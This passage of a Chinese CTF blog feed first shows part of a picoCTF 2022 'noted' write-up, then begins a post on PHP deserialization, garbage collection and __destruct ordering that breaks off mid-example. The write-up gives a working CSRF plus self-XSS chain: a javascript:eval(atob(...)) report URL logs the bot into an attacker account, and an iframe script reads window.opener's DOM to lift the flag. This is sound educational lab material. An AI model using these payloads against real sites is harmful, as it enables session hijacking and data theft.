&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[name=&amp;#34;content&amp;#34;]&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">process&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">env&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">FLAG&lt;/span> &lt;span style="color:#f92672">??&lt;/span> &lt;span style="color:#d88200">&amp;#39;ctf{flag}&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#111">Promise&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">all&lt;/span>&lt;span style="color:#111">([&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">click&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[type=&amp;#34;submit&amp;#34;]&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">waitForNavigation&lt;/span>&lt;span style="color:#111">({&lt;/span> &lt;span style="color:#75af00">waituntil&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;domcontentloaded&amp;#39;&lt;/span> &lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#00a8c8">goto&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;about:blank&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#00a8c8">goto&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">waitForTimeout&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">7500&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">browser&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">browser&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">module&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">exports&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">open&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">module&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">exports&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">open&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">run&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// web.js
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">fastify&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/report&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">schema&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">reportSchema&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">preHandler&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">fastify&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">csrfProtection&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">},&lt;/span> &lt;span style="color:#75af00">auth&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">report&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">open&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Only one browser can be open at a time!&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">report&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;URL has been reported.&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在notes.ejs中用&lt;code>&amp;lt;%- something %&amp;gt;&lt;/code>的模板形式输出内容&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-ejs" data-lang="ejs">&amp;lt;h2&amp;gt;&amp;lt;%- note.title %&amp;gt;&amp;lt;/h2&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;%- note.content %&amp;gt;&amp;lt;/p&amp;gt;
&lt;/code>&lt;/pre>&lt;p>可以做到self-xss，我们联想到csrf+xss的常见打法：xss一个csrf的内容，比如这里的登录账号的表单；但是flag是在随机账号中，要xss必须也覆盖cookie&lt;/p>
&lt;p>联想TBDXSS那个题目 两个tab之间实现内容的读取：如果window A B都有相同的document.domain，只要有window reference就可以读取另一个window的DOM内容；所以只要让A是POST login之前的页面，B是self-xss的页面，读取A的DOM就可以拿到flag&lt;/p>
&lt;p>另外注意一下report.js中并没有对我们的url加waf，所以&lt;code>javascript:alert(1)&lt;/code>之类的url也能在&lt;code>about:blank&lt;/code>上xss 或者开新的window构成csrf，比如像&lt;code>javascript:eval(atob(xxxx))&lt;/code>这样操作js内容&lt;/p>
&lt;p>关于flag的回显，由于bot不出网，我们考虑创建一个账号，将flag用self-xss+iframe的方式传回来&lt;/p>
&lt;p>提交url，用&lt;code>javascript:&lt;/code>形式的url 包含一个csrf的表单，强制登入我们的账号&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">csrf&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;lt;form name=frm action=&amp;#39;http://0.0.0.0:8080/login&amp;#39; method=post&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;lt;input name=username value=supernene&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;lt;input name=password value=supernene&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;lt;/form&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">`&lt;/span> &lt;span style="color:#75715e">// 登入我们的已知账户
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">js&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">win = window.open(&amp;#39;&amp;#39;, &amp;#39;&amp;#39;)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">win.document.body.innerHTML = atob(&amp;#39;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">btoa&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">csrf&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">win.document.frm.submit()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">location.href = &amp;#39;http://0.0.0.0:8080&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">`&lt;/span> &lt;span style="color:#75715e">// 在about:blank页面操作
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`javascript:eval(atob(&amp;#39;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">btoa&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">js&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;))`&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>登入的我们的账号中含有如下的self-xss payload，读取之前bot页面中的flag，&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">iframe&lt;/span> &lt;span style="color:#75af00">src&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;/new&amp;#34;&lt;/span> &lt;span style="color:#75af00">id&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">frm&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">iframe&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">opener&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">textContent&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">frm&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onload&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">()=&amp;gt;{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">frm&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onload&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">newfrm&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">frm&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">contentDocument&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">forms&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#75715e">// 确保new tab
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">newfrm&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">title&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;FLAG&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">newfrm&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">content&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">flag&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">newfrm&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">submit&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>参考：&lt;a href="https://blog.maple3142.net/2022/03/29/picoctf-2022-writeups/#noted">wp1&lt;/a> | &lt;a href="https://github.com/dtreplin/ctf-writeups/blob/main/picoCTF_2022_web_exploitation_noted.md">wp2&lt;/a>&lt;/p></description></item><item><title>php反序列化中的报错&amp;GC与二次序列化问题</title><link>https://amiaaaz.github.io/2022/04/24/php-unserialize-notes/</link><pubDate>Sun, 24 Apr 2022 21:42:33 +0800</pubDate><guid>https://amiaaaz.github.io/2022/04/24/php-unserialize-notes/</guid><description>&lt;h2 id="报错gc相关问题">报错&amp;amp;GC相关问题&lt;/h2>
&lt;p>PHP是存在GC的语言，而反序列化对象时的&lt;code>__destruct&lt;/code>就是对已new对象的回收，一个小栗子&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">error_reporting&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">test&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$num&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$num&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">num&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$num&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">num&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;__construct&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;/br&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">num&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;__destruct&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;/br&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">test&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">test&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">test&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 1__construct&amp;lt;/br&amp;gt;1__destruct&amp;lt;/br&amp;gt;2__construct&amp;lt;/br&amp;gt;3__construct&amp;lt;/br&amp;gt;3__destruct&amp;lt;/br&amp;gt;2__destruct&amp;lt;/br&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>当下面的三行代码均和第一行一样，无引用和指向，那么都将会是依次的construct+destruct，但是在上述例子中，只有对象1没有引用和指向 所以只有它创建后立刻回收；再看下面这两种情况&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">test&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$c&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$c&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">test&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">test&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 1__construct&amp;lt;/br&amp;gt;1__destruct&amp;lt;/br&amp;gt;2__construct&amp;lt;/br&amp;gt;3__construct&amp;lt;/br&amp;gt;3__destruct&amp;lt;/br&amp;gt;2__destruct&amp;lt;/br&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">test&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// $c[0] = $c[1];
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">test&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">test&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">);&lt;/span>
